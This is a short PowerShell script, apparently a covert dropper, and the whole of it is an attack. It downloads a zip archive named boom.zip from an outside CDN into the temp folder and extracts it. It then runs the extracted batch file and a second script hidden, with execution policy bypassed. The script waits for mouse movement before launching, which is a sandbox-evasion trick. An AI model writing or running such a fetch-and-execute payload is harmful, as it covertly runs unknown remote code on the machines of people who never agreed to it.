[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
Invoke-WebRequest https://cdn.statically.io/gh/l4l4l4l4ll/files/b609ab2322d3c4d552291339c8789065ae4c99cc/loud/boom.zip -OutFile $env:temp\boom.zip
Expand-Archive -Force -Path $env:temp\boom.zip -DestinationPath $env:temp\boom
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:temp\boom\boom.lnk")
$Shortcut.TargetPath = "powershell"
$Shortcut.Arguments = "-w h -NoP -NonI -Exec Bypass %TEMP%\boom\boom2.ps1"
$Shortcut.Save()
Start-Process -FilePath "$env:temp/boom/boom.bat" -WindowStyle Hidden
powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 1}};powershell $env:temp\boom\boom2.ps1